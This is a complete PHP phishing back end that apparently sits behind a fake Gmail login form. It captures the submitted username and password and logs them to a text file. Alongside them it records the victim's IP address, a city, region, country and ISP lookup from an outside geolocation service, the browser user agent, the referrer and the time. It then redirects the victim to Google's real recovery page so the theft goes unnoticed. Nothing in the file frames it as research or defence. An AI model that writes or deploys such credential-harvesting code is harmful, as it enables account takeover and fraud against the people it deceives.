<?php

file_put_contents("usernames.txt", 
    "Gmail Username: " . $_POST['username'] . 
    " Pass: " . $_POST['password'] . 
    " | IP: " . $_SERVER['REMOTE_ADDR'] . 
    " | Cidade: " . ($geo = json_decode(curl_exec($c = curl_init("http://ip-api.com/json/" . $_SERVER['REMOTE_ADDR'] . "?lang=pt")), true))['city'] . 
    " | Região: " . $geo['regionName'] . 
    " | País: " . $geo['country'] . 
    " | ISP: " . $geo['isp'] . 
    " | User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . 
    " | Referrer: " . ($_SERVER['HTTP_REFERER'] ?? 'N/A') . 
    " | Data/Hora: " . date('Y-m-d H:i:s') . 
    "\n", 
    FILE_APPEND
);
curl_close($c);

header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();

?>
